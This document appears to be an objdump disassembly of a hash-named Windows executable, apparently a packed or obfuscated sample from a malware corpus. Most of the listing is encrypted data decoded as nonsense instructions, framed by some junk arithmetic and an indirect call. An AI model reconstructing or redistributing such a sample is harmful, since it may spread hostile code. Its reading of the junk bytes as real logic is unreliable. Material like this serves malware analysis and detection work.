
74d53a3f250d23bf0992f80b12a2d760714742f45529afa75719208ce8e32ea5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x428451,0x4284f1
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428475,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x42835d
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428469,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x428431
  40104f:	xor    DWORD PTR ds:0x428575,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	fsubr  DWORD PTR [ebp+0x20]
  40106c:	sahf   
  40106d:	mov    esi,0xbdbebebe
  401072:	les    edi,FWORD PTR [esi+0x44bcf0be]
  401078:	mov    edx,DWORD PTR [esi]
  40107a:	ds out 0x1f,al
  40107d:	(bad)  [eax+0x5be9ef0]
  401083:	inc    ebp
  401084:	pop    ds
  401085:	mov    bl,0xdd
  401088:	lds    esp,FWORD PTR [ebp+0x6e]
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    ?,WORD PTR [esp+eax*4-0x44]
  4010ad:	int    0xf4
  4010af:	cmp    esp,eax
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xfe52947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcl    bh,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	jmp    0x401083
  4010c8:	cmp    BYTE PTR [esi],dh
  4010ca:	dec    ecx
  4010cb:	in     al,dx
  4010cc:	inc    edx
  4010cd:	lds    esi,FWORD PTR [edx+0x14b8a40a]
  4010d3:	dec    ecx
  4010d4:	xor    al,0x43
  4010d6:	jnp    0x40108a
  4010d8:	cmp    DWORD PTR [ebx-0x4eee7882],esi
  4010de:	outs   dx,DWORD PTR cs:[esi]
  4010e0:	cmp    al,0x9b
  4010e2:	leave  
  4010e3:	xchg   edx,eax
  4010e4:	rcr    BYTE PTR [edi],1
  4010e6:	sbb    al,0xe5
  4010e8:	sar    BYTE PTR [esi-0x13a3499a],0xf5
  4010ef:	sti    
  4010f0:	loop   0x401141
  4010f2:	jge    0x4010bf
  4010f4:	loope  0x401136
  4010f6:	retf   0x667a
  4010f9:	mov    ds:0xee122471,al
  4010fe:	add    al,BYTE PTR [edi]
  401100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401101:	rcr    ecx,cl
  401103:	jl     0x401168
  401105:	mov    edi,0x290da2fa
  40110a:	(bad)  
  40110b:	adc    eax,0x1ea49599
  401110:	repz xor DWORD PTR [ecx+0x1a280add],esp
  401117:	je     0x40111a
  401119:	ror    BYTE PTR [edi-0x39],cl
  40111c:	jnp    0x401149
  40111e:	pop    esp
  40111f:	and    DWORD PTR [edi-0x31d5af61],ebp
  401125:	or     BYTE PTR [edi+0xe],bl
  401128:	leave  
  401129:	mov    ch,0xa1
  40112b:	shl    BYTE PTR [ebp-0x7a],1
  40112e:	jmp    0x251ca0ef
  401133:	(bad)  
  401134:	xchg   edi,eax
  401135:	jl     0x401103
  401137:	inc    ebx
  401138:	mov    bh,0x35
  40113a:	mov    edi,0xdfd71745
  40113f:	adc    DWORD PTR [ebx-0x5589cd7c],ebp
  401145:	pop    ebx
  401146:	lods   al,BYTE PTR ds:[esi]
  401147:	xchg   ebp,eax
  401148:	ss jge 0x401170
  40114b:	aas    
  40114c:	fisttp QWORD PTR ds:0x707a79
  401152:	int3   
  401153:	wbinvd 
  401155:	rcl    DWORD PTR [ecx-0x2],1
  401158:	mov    cl,0x94
  40115a:	sub    ecx,DWORD PTR [eax-0x7d324b39]
  401160:	in     eax,dx
  401161:	inc    ebp
  401162:	and    DWORD PTR [esi-0x4f],ecx
  401165:	out    dx,al
  401166:	(bad)  
  401168:	pop    ebx
  401169:	div    ecx
  40116b:	mov    ds:0x426351fd,al
  401170:	sahf   
  401171:	stc    
  401172:	leave  
  401173:	jmp    0x4c7da10
  401178:	cdq    
  401179:	or     bl,BYTE PTR [edi]
  40117b:	inc    esp
  40117c:	leave  
  40117d:	inc    edi
  40117e:	mov    ecx,0x906d41f4
  401183:	mov    DWORD PTR [esi-0x14450b31],edx
  401189:	int    0x99
  40118b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40118c:	test   al,0x77
  40118e:	mov    eax,ds:0x56710c5c
  401193:	inc    esp
  401194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401195:	pop    esp
  401196:	add    ebx,DWORD PTR [ebx]
  401198:	popa   
  401199:	ds jae 0x401159
  40119c:	push   esi
  40119d:	sbb    edi,DWORD PTR [ebx-0x105c905f]
  4011a3:	dec    esp
  4011a4:	mov    dh,0x97
  4011a6:	in     eax,dx
  4011a7:	adc    eax,0xf692046e
  4011ac:	pop    ecx
  4011ad:	gs and dl,cl
  4011b0:	xor    eax,0x4fec283d
  4011b5:	aam    0xfa
  4011b7:	lds    ebx,FWORD PTR [eax+ecx*2-0x4d]
  4011bb:	inc    esp
  4011bc:	cli    
  4011bd:	jge    0x4011c7
  4011bf:	out    dx,eax
  4011c0:	jae    0x401145
  4011c2:	or     bl,ah
  4011c4:	or     eax,0x827807ee
  4011c9:	fcomp  st(2)
  4011cb:	and    ebp,ecx
  4011cd:	push   ss
  4011ce:	or     ah,BYTE PTR [edi]
  4011d0:	js     0x40116a
  4011d2:	hlt    
  4011d3:	test   DWORD PTR [eax-0x3efe4d66],0x3a64bcc8
  4011dd:	push   eax
  4011de:	xchg   esi,eax
  4011df:	jl     0x40116b
  4011e1:	mov    edx,0xf592389a
  4011e6:	xor    BYTE PTR [edi+0x29],al
  4011e9:	fdivr  QWORD PTR [eax]
  4011eb:	push   ebx
  4011ec:	mov    cl,0x99
  4011ee:	xchg   ebp,eax
  4011ef:	repz dec esi
  4011f1:	inc    esi
  4011f2:	mov    bh,0x58
  4011f4:	xchg   esi,eax
  4011f5:	or     dl,BYTE PTR [ebp+0x7c3ec300]
  4011fb:	pusha  
  4011fc:	scas   al,BYTE PTR es:[edi]
  4011fd:	mov    BYTE PTR [eax],al
  4011ff:	shr    DWORD PTR [esi-0x5],cl
  401202:	adc    eax,DWORD PTR [ebx+0x6b]
  401205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401206:	and    al,0xba
  401208:	adc    eax,0x1160ed9c
  40120d:	push   0x1d
  40120f:	fdivr  DWORD PTR [ebx+0x32]
  401212:	xchg   ebp,eax
  401213:	jne    0x401255
  401215:	sbb    DWORD PTR [ecx-0x4a],ebp
  401218:	sbb    esi,esp
  40121a:	jge    0x401224
  40121c:	mov    al,ds:0x29f160b5
  401221:	stos   BYTE PTR es:[edi],al
  401222:	push   0x2841a6bc
  401227:	xor    dh,BYTE PTR ds:0x3b816ba7
  40122d:	rcl    BYTE PTR [esi],0xb3
  401230:	daa    
  401231:	dec    esp
  401232:	pusha  
  401233:	mov    al,0x6d
  401235:	mov    esi,0xd78451c5
  40123a:	push   0x5a
  40123c:	inc    BYTE PTR [eax-0x5e]
  40123f:	ret    0xf57e
  401242:	mov    bh,BYTE PTR [eax+ecx*4-0x1d]
  401246:	jne    0x401230
  401248:	sbb    DWORD PTR [esi-0x1bf9a101],edx
  40124e:	dec    edx
  40124f:	ret    
  401250:	(bad)  
  401251:	sahf   
  401252:	mov    eax,ds:0x3cd51640
  401257:	dec    esi
  401258:	pop    ebp
  401259:	fld    TBYTE PTR [esi]
  40125b:	enter  0xbbce,0x2e
  40125f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401260:	popf   
  401261:	push   esp
  401262:	mov    esi,0xbab61689
  401267:	add    DWORD PTR [esi],esp
  401269:	hlt    
  40126a:	stos   BYTE PTR es:[edi],al
  40126b:	iret   
  40126c:	fidivr WORD PTR [eax]
  40126e:	push   edx
  40126f:	repnz mov esp,DWORD PTR [ebx-0x66]
  401273:	cmp    ebp,DWORD PTR [edi+0x29b80a11]
  401279:	cmp    DWORD PTR [edi],ebp
  40127b:	pop    ds
  40127c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127d:	jnp    0x4012f9
  40127f:	xcrypt-ecb (bad)
  401280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401281:	leave  
  401282:	mov    al,0x14
  401284:	into   
  401285:	pop    esp
  401286:	and    DWORD PTR [esi+0x59ccfe08],edx
  40128c:	or     BYTE PTR [eax],bl
  40128e:	pop    eax
  40128f:	dec    esi
  401290:	leave  
  401291:	inc    esi
  401292:	leave  
  401293:	ret    0xb08
  401296:	loopne 0x401265
  401298:	enter  0xf321,0x17
  40129c:	pop    ecx
  40129d:	out    dx,al
  40129e:	add    ebp,DWORD PTR [eax+0x93f43d4]
  4012a4:	push   esi
  4012a5:	mul    BYTE PTR [ecx-0x46]
  4012a8:	sbb    DWORD PTR [edx+0x77c4005e],edx
  4012ae:	and    eax,0x11a0327a
  4012b3:	cmp    eax,0xf3688775
  4012b8:	jmp    0x1999:0xd0ee2a0d
  4012bf:	jmp    0x3d9cf88f
  4012c4:	lea    ebx,[edx]
  4012c6:	ror    BYTE PTR ss:[edx-0x6c7d0f7d],cl
  4012cd:	pusha  
  4012ce:	jbe    0x4012a2
  4012d0:	mov    ebx,0x49f2cce1
  4012d5:	and    DWORD PTR ds:0x17b65003,ebx
  4012db:	retf   0x7efc
  4012de:	loopne 0x40134a
  4012e0:	mov    ds:0x5fa8f607,eax
  4012e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012e6:	test   dl,ah
  4012e8:	sub    al,ch
  4012ea:	adc    al,0x2b
  4012ec:	sub    al,0xfb
  4012ee:	mov    BYTE PTR [ecx+0x79],bl
  4012f1:	(bad)  
  4012f2:	repnz mov ebp,0x6ed5b077
  4012f8:	(bad)  
  4012f9:	or     eax,0x156764fb
  4012fe:	and    edi,DWORD PTR [edi+eiz*4+0x41bae6db]
  401305:	pop    ss
  401306:	test   eax,0xf0a4f20c
  40130b:	adc    eax,esp
  40130d:	push   esi
  40130e:	inc    esp
  40130f:	cld    
  401310:	or     BYTE PTR [ebx-0x591ef1ba],0xe0
  401317:	sub    edi,DWORD PTR [ebp+0x64aa9ac3]
  40131d:	mov    edi,0xcc2071a1
  401322:	and    BYTE PTR [esi+eiz*8],ah
  401325:	cmc    
  401326:	mov    eax,0x6084d216
  40132b:	iret   
  40132c:	cmp    BYTE PTR [edx-0x6],dl
  40132f:	pushf  
  401330:	inc    esp
  401331:	push   0x12
  401333:	pop    eax
  401334:	sbb    esi,esp
  401336:	add    al,0x3b
  401338:	or     BYTE PTR [ecx-0x5e],dl
  40133b:	jns    0x401309
  40133d:	sub    ch,bh
  40133f:	jl     0x40137a
  401341:	add    eax,0xe6db9b48
  401346:	jp     0x401326
  401348:	addr16 jmp 0x40134c
  40134b:	pop    edx
  40134c:	sbb    BYTE PTR ds:0xe7f2ccc,bh
  401352:	scas   al,BYTE PTR es:[edi]
  401353:	in     al,dx
  401354:	cmp    al,0xa5
  401356:	xor    BYTE PTR [edi-0x29fe3436],bl
  40135c:	ror    DWORD PTR [ebx],1
  40135e:	add    edx,DWORD PTR [ebx+eax*2]
  401361:	fist   WORD PTR [edx]
  401363:	mov    bl,0xf0
  401366:	mov    edx,0xef8f75da
  40136b:	pop    ebp
  40136c:	push   eax
  40136d:	sbb    ecx,DWORD PTR [edx-0x6ba3eec2]
  401373:	lods   al,BYTE PTR ds:[esi]
  401374:	fcom   QWORD PTR [edx+0x1aff6eec]
  40137a:	repz je 0x4013a7
  40137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40137e:	dec    esp
  40137f:	mov    dh,0xf9
  401381:	int3   
  401382:	jbe    0x40136b
  401384:	xchg   edx,ecx
  401386:	es nop
  401388:	pushf  
  401389:	xchg   BYTE PTR [esi-0x22],ah
  40138c:	xchg   ebp,eax
  40138d:	fist   DWORD PTR [ebx]
  40138f:	ficom  WORD PTR [esi+ecx*2]
  401392:	aas    
  401393:	or     BYTE PTR ds:0x83e05cd7,al
  401399:	(bad)  
  40139a:	imul   eax,DWORD PTR [edi-0x617f113e],0x26cb2f68
  4013a4:	add    esi,ebx
  4013a6:	in     al,dx
  4013a7:	cdq    
  4013a8:	pop    ebx
  4013a9:	lea    edx,[edx]
  4013ab:	adc    al,0x2
  4013ad:	sbb    BYTE PTR [esi],bh
  4013af:	and    esp,edi
  4013b1:	add    DWORD PTR [esi-0x4f],ebp
  4013b4:	ja     0x401387
  4013b6:	ds xor ah,cl
  4013b9:	mov    al,ds:0xfdd321de
  4013be:	loopne 0x401385
  4013c0:	arpl   WORD PTR [ecx-0x476b6e35],cx
  4013c6:	mov    edi,0x4df0d51
  4013cb:	repz xchg edx,eax
  4013cd:	adc    DWORD PTR [esi-0x2a0dafe6],esp
  4013d3:	pop    DWORD PTR ds:0xec47e089
  4013d9:	dec    edx
  4013da:	sub    al,BYTE PTR fs:[edx-0x15a735ba]
  4013e1:	dec    eax
  4013e2:	mov    edx,0x2b14c9f0
  4013e7:	push   edi
  4013e8:	mov    cl,0x5a
  4013ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013eb:	int    0x3c
  4013ed:	sbb    BYTE PTR [ecx+0x9],0xd2
  4013f1:	fiadd  DWORD PTR [edi-0x20]
  4013f4:	mov    esi,DWORD PTR [ebx]
  4013f6:	(bad)  
  4013f7:	(bad)  
  4013f8:	arpl   WORD PTR [ebx+0x3d03ac4d],cx
  4013fe:	rol    DWORD PTR [edx+eax*2-0x57aa7500],1
  401405:	sbb    DWORD PTR ds:0x4284e9,ecx
  40140b:	mov    edi,DWORD PTR [ebp-0x54]
  40140e:	sub    DWORD PTR ds:0x428575,0x1812
  401418:	sub    eax,edx
  40141a:	movzx  edx,BYTE PTR ds:0x428461
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x619b7da9],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x4feaf0be]
  401441:	mov    DWORD PTR [ebx+0x46b907cc],esi
  401447:	dec    eax
  401448:	out    0x79,eax
  40144a:	cmp    al,0x3e
  40144d:	mov    bl,BYTE PTR [esi+0x460a7596]
  401453:	sub    BYTE PTR [edi+0x5e],bh
  401456:	mov    bh,bh
  401458:	bound  esp,QWORD PTR [esi]
  40145a:	test   al,0x91
  40145c:	scas   al,BYTE PTR es:[edi]
  40145d:	shl    DWORD PTR gs:[esi+0x6e],1
  401461:	lock mov esi,0x7c5f8dab
  401467:	inc    esp
  401468:	pop    ds
  401469:	jecxz  0x4013ed
  40146b:	xor    edi,DWORD PTR [edx+0xf]
  40146e:	repnz and BYTE PTR [ecx-0x29996f5e],dl
  401475:	mov    ch,0x4d
  401477:	push   eax
  401478:	pop    ecx
  401479:	push   ecx
  40147a:	mov    eax,0xb729a569
  40147f:	nop
  401480:	pop    es
  401481:	mov    eax,0xd760af08
  401486:	retf   0xfcca
  401489:	jg     0x4014dd
  40148b:	mov    al,0xbe
  40148d:	ins    BYTE PTR es:[edi],dx
  40148e:	shl    BYTE PTR [esi-0x104db2f6],0xcb
  401495:	sub    DWORD PTR [ecx],edi
  401497:	imul   edi,DWORD PTR [edi],0xaf62ffd6
  40149d:	js     0x40143a
  40149f:	fst    QWORD PTR [ebp+eax*1-0x46f5f6b6]
  4014a6:	test   bl,bh
  4014a8:	shr    BYTE PTR [esp+edi*1],cl
  4014ab:	sbb    edx,DWORD PTR [eax+0x5a57f1c9]
  4014b1:	cld    
  4014b2:	jno    0x4014ee
  4014b4:	jl     0x4014fb
  4014b6:	inc    ebx
  4014b7:	and    al,0x6
  4014b9:	add    BYTE PTR [eax+0x248faae4],ah
  4014bf:	scas   eax,DWORD PTR es:[edi]
  4014c0:	jmp    0xe629003
  4014c5:	(bad)  
  4014c6:	mov    ah,0x4d
  4014c8:	in     eax,dx
  4014c9:	and    esp,DWORD PTR [esi]
  4014cb:	ins    BYTE PTR es:[edi],dx
  4014cc:	sahf   
  4014cd:	jg     0x4014e4
  4014cf:	daa    
  4014d0:	push   ss
  4014d1:	mov    ebp,0x628fc444
  4014d6:	loope  0x4014f1
  4014d8:	pop    edi
  4014d9:	popa   
  4014da:	xlat   BYTE PTR ds:[ebx]
  4014db:	fwait
  4014dc:	(bad)
  4014df:	cmp    eax,0x39ee35b2
  4014e4:	fild   DWORD PTR [ecx-0x5496e35a]
  4014ea:	enter  0xabea,0x4c
  4014ee:	sub    ebp,DWORD PTR [esi+0x48]
  4014f1:	(bad)  
  4014f2:	pop    eax
  4014f3:	jmp    0xae97b97f
  4014f8:	repnz push ebx
  4014fa:	std    
  4014fb:	inc    esp
  4014fc:	mov    esi,0x2b4de0be
  401501:	outs   dx,DWORD PTR ds:[esi]
  401502:	mov    fs,WORD PTR ds:0x83607c0f
  401508:	ins    DWORD PTR es:[edi],dx
  401509:	xchg   esp,eax
  40150a:	es out dx,al
  40150c:	icebp  
  40150d:	call   0x27bd:0xcdbde6d0
  401514:	push   0xffffffa9
  401516:	inc    ecx
  401517:	ss (bad) 
  401519:	outs   dx,BYTE PTR ds:[esi]
  40151a:	jg     0x4014c4
  40151c:	es (bad) 
  40151e:	enter  0xd9d8,0x49
  401522:	mov    esi,0xe9f4ee93
  401527:	dec    eax
  401528:	sahf   
  401529:	jle    0x401581
  40152b:	aam    0x17
  40152d:	sub    eax,0xa065b1c9
  401532:	pop    eax
  401533:	int    0x45
  401535:	fdiv   st(5),st
  401537:	sbb    DWORD PTR [ecx+edx*8+0x4d661fff],edi
  40153e:	cmp    ebx,DWORD PTR [edi-0x4cf6a2bc]
  401544:	xchg   DWORD PTR [eax+0x19],esp
  401547:	and    ecx,DWORD PTR [edx+0xf]
  40154a:	pushf  
  40154b:	xchg   esp,eax
  40154c:	sbb    eax,0xe5ea2abf
  401551:	dec    ebp
  401552:	aaa    
  401553:	mov    al,ds:0xe494afc9
  401558:	cmp    eax,0xc42e6865
  40155d:	and    BYTE PTR [ebx+eax*1+0x1e0f6227],0xf9
  401565:	add    eax,0x2e41ec95
  40156a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40156b:	add    al,0x32
  40156d:	push   0xffffffa8
  40156f:	inc    ecx
  401570:	xor    eax,0xf2040b96
  401575:	xchg   esp,eax
  401576:	inc    edi
  401577:	in     al,dx
  401578:	(bad)  
  401579:	dec    esi
  40157a:	ret    0x4308
  40157d:	push   cs
  40157e:	aaa    
  40157f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401580:	mov    al,ds:0x3a2918d1
  401585:	icebp  
  401586:	sub    dh,ah
  401588:	cmp    al,0xf2
  40158a:	mov    ds:0x8d2afda1,eax
  40158f:	jl     0x401551
  401591:	xor    bl,dl
  401593:	call   0x8a6f590b
  401598:	xor    edi,DWORD PTR [esi+edx*8+0x16b76b2f]
  40159f:	dec    esp
  4015a0:	or     eax,0x570a12d5
  4015a5:	loopne 0x4015d7
  4015a7:	in     al,dx
  4015a8:	cwde   
  4015a9:	push   ecx
  4015aa:	and    BYTE PTR [esp+eiz*8+0x6888d85f],cl
  4015b1:	sbb    BYTE PTR [eax+0x5fb79cd8],ah
  4015b7:	jg     0x401546
  4015b9:	mov    dh,0x55
  4015bb:	je     0x401580
  4015bd:	push   0xb0c80f97
  4015c2:	sbb    DWORD PTR [edi+0x53b02b80],ecx
  4015c8:	(bad)  
  4015c9:	pop    esp
  4015ca:	imul   edx,DWORD PTR [esp+ecx*4],0xbdcc0b47
  4015d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d2:	or     eax,0x6caa6f47
  4015d7:	jns    0x401616
  4015d9:	jle    0x4015dc
  4015db:	gs es rcr edi,cl
  4015df:	ret    0x46d3
  4015e2:	cmp    DWORD PTR [ebx+0x24d4c80b],edi
  4015e8:	push   ss
  4015e9:	icebp  
  4015ea:	icebp  
  4015eb:	and    eax,0xcda61615
  4015f0:	sar    DWORD PTR [edx+eiz*1+0x66],1
  4015f4:	popa   
  4015f5:	jl     0x4015af
  4015f7:	inc    edi
  4015f8:	icebp  
  4015f9:	dec    eax
  4015fa:	mov    ah,0x17
  4015fc:	(bad)  
  4015fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015ff:	ficom  DWORD PTR [ebp+0x1c0b87a2]
  401605:	cdq    
  401606:	cs inc eax
  401608:	retf   0x7ebc
  40160b:	imul   edi,DWORD PTR [eax],0x20200f06
  401611:	gs add eax,0x4622750
  401617:	fcom   DWORD PTR [ecx+0xb]
  40161a:	mov    dh,0x4d
  40161c:	push   edi
  40161d:	adc    ch,dl
  40161f:	call   0xf66f:0x782b670
  401626:	mov    ecx,0x6e884442
  40162b:	push   ebx
  40162c:	ret    0x4bdc
  40162f:	push   0x15
  401631:	gs jecxz 0x401600
  401634:	sbb    cl,ah
  401636:	pop    ds
  401637:	dec    eax
  401638:	pop    ds
  401639:	sub    ch,cl
  40163b:	pop    esp
  40163c:	retf   
  40163d:	xor    eax,0x81d70ab5
  401642:	mov    bh,0xba
  401644:	xchg   edx,eax
  401645:	xchg   ebx,eax
  401646:	pop    ss
  401647:	push   ebp
  401648:	repnz xor al,0xdd
  40164b:	mov    al,ds:0xea0e151b
  401650:	fisttp QWORD PTR [ecx+0x23]
  401653:	xor    DWORD PTR [eax+ecx*2],ecx
  401656:	push   ss
  401657:	in     eax,dx
  401658:	ret    
  401659:	pushf  
  40165a:	test   edi,edi
  40165c:	sbb    bh,cl
  40165e:	mov    al,0xa7
  401660:	sub    eax,0xd0fa4d01
  401665:	sar    DWORD PTR [ebx-0x28],cl
  401668:	mov    eax,0x5a8f7a28
  40166d:	iret   
  40166e:	test   al,0x16
  401670:	mov    ecx,0xdb38f27c
  401675:	sub    DWORD PTR [bp+si-0xc],edx
  401679:	mov    DWORD PTR [ebp-0x44],ebp
  40167c:	stos   DWORD PTR es:[edi],eax
  40167d:	lea    ebp,[edi]
  40167f:	dec    eax
  401680:	inc    ecx
  401681:	jle    0x4016a2
  401683:	dec    eax
  401684:	rcr    ebx,1
  401686:	pop    edi
  401687:	sub    esi,DWORD PTR [esi+0x1058c2c1]
  40168d:	add    BYTE PTR [eax-0x90026f6],0x1e
  401694:	adc    edi,DWORD PTR [eax-0x20]
  401697:	add    BYTE PTR [ebx+0xb18ef6a],bh
  40169d:	lock dec esp
  40169f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a0:	jns    0x401635
  4016a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a3:	ja     0x40163b
  4016a5:	stc    
  4016a6:	and    edx,ebx
  4016a8:	aas    
  4016a9:	(bad)  
  4016aa:	sbb    al,0x30
  4016ac:	push   0x3d130153
  4016b1:	into   
  4016b2:	leave  
  4016b3:	scas   al,BYTE PTR es:[edi]
  4016b4:	sub    eax,0xe6707178
  4016b9:	repz js 0x4016e3
  4016bc:	imul   esp,esp,0x3fae3d02
  4016c2:	jge    0x4016c1
  4016c4:	mov    dh,0x80
  4016c6:	adc    al,BYTE PTR [esi+0x17]
  4016c9:	das    
  4016ca:	bnd jno 0x40172a
  4016cd:	dec    edx
  4016ce:	add    DWORD PTR [edi+0xf2f9e11],ebp
  4016d4:	into   
  4016d5:	push   ebx
  4016d6:	int    0x1e
  4016d8:	xor    bl,ch
  4016da:	aam    0x13
  4016dc:	mov    DWORD PTR [edi],esp
  4016de:	js     0x4016e6
  4016e0:	jno    0x4016dd
  4016e2:	inc    edi
  4016e3:	jmp    0xc3a9:0xf34d00f3
  4016ea:	lock pop es
  4016ec:	sub    al,0x45
  4016ee:	mov    ds,edi
  4016f0:	mov    ds,ecx
  4016f2:	ja     0x40167c
  4016f4:	test   BYTE PTR [eax-0x39],ch
  4016f7:	jge    0x4016f8
  4016f9:	xlat   BYTE PTR ds:[ebx]
  4016fa:	cdq    
  4016fb:	fs ja  0x401721
  4016fe:	xchg   ecx,eax
  4016ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401700:	loope  0x40168b
  401702:	dec    eax
  401703:	xor    BYTE PTR [esi-0x347951a5],al
  401709:	pop    ds
  40170a:	mov    dh,0x9a
  40170c:	fnstenv [ebx+0x29]
  40170f:	mov    ch,0xde
  401711:	jbe    0x401769
  401713:	ja     0x401731
  401715:	xor    eax,0x5e8ae1b3
  40171a:	imul   ebp,DWORD PTR [ecx],0x910b9d1d
  401720:	pop    ebp
  401721:	mov    dl,dh
  401723:	mov    bh,BYTE PTR [ebp-0x4f]
  401726:	dec    ecx
  401727:	push   ebp
  401728:	dec    ebp
  401729:	stos   BYTE PTR es:[edi],al
  40172a:	jg     0x40176b
  40172c:	cmp    ebx,DWORD PTR [ebx+0x38]
  40172f:	int3   
  401730:	mov    gs,WORD PTR [eax]
  401732:	jle    0x4016f4
  401734:	aam    0xe9
  401736:	mov    es,WORD PTR [edx]
  401738:	mov    cl,0xc
  40173a:	repnz sub edx,DWORD PTR [ecx-0x38e08910]
  401741:	jo     0x40177a
  401743:	mov    DWORD PTR [ecx-0xb27959d],ebp
  401749:	cld    
  40174a:	(bad)  
  40174b:	test   al,0x97
  40174d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40174e:	sti    
  40174f:	jl     0x4016fd
  401751:	mov    dl,0x77
  401753:	sar    BYTE PTR [esi-0x68],0x5c
  401757:	mov    ch,0x9d
  401759:	sbb    BYTE PTR [ebx],al
  40175b:	(bad)  
  40175c:	xchg   edi,eax
  40175d:	retf   0x195c
  401760:	mov    edx,edi
  401762:	cmp    bh,al
  401764:	or     al,0xc2
  401766:	jp     0x94309769
  40176c:	out    0x17,al
  40176e:	mov    eax,ds:0xdc6a8bce
  401773:	popa   
  401774:	nop
  401775:	cdq    
  401776:	cdq    
  401777:	cmc    
  401778:	loopne 0x401762
  40177a:	pop    eax
  40177b:	cmc    
  40177c:	mov    bl,0xe0
  40177e:	loopne 0x40173a
  401780:	das    
  401781:	or     al,0x67
  401783:	bound  ecx,QWORD PTR [edx]
  401785:	enter  0x4934,0x10
  401789:	and    ah,BYTE PTR [edi+0x3c]
  40178c:	mov    edx,0xdd0fda97
  401791:	je     0x401717
  401793:	stos   BYTE PTR es:[edi],al
  401794:	repnz icebp 
  401796:	es pop eax
  401798:	xchg   edx,eax
  401799:	daa    
  40179a:	int    0x58
  40179c:	aad    0xea
  40179e:	adc    eax,0xd2c4a3f3
  4017a3:	jl     0x4017d7
  4017a5:	xor    esp,DWORD PTR [edi-0x61]
  4017a8:	jbe    0x40179d
  4017aa:	sbb    ah,bl
  4017ac:	ja     0x40177d
  4017ae:	fidiv  WORD PTR [ebx+0x7c]
  4017b1:	call   0x1f0c:0x93cfec44
  4017b8:	inc    eax
  4017b9:	retf   
  4017ba:	push   es
  4017bb:	out    0x19,eax
  4017bd:	fstp   TBYTE PTR [ecx]
  4017bf:	add    DWORD PTR [ebx-0x57ba769d],0x1b
  4017c6:	iret   
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x428451,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x428449,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428565
  4017f4:	movzx  ecx,WORD PTR ds:0x428359
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x428449,0x0
  401811:	ja     0x401846
  401817:	push   0x428295
  40181c:	call   DWORD PTR ds:0x42e09c
  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x428355
  40182a:	xor    DWORD PTR ds:0x4284c5,edx
  401830:	mov    edi,DWORD PTR ds:0x428435
  401836:	or     DWORD PTR ds:0x4284cd,edi
  40183c:	or     DWORD PTR ds:0x428345,0x7336
  401846:	sbb    DWORD PTR ds:0x428449,0x42f3
  401850:	mov    DWORD PTR ds:0x428579,0x382b
  40185a:	inc    DWORD PTR ds:0x428581
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x422580
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428465,0xc55
  401875:	mov    eax,DWORD PTR [eax]
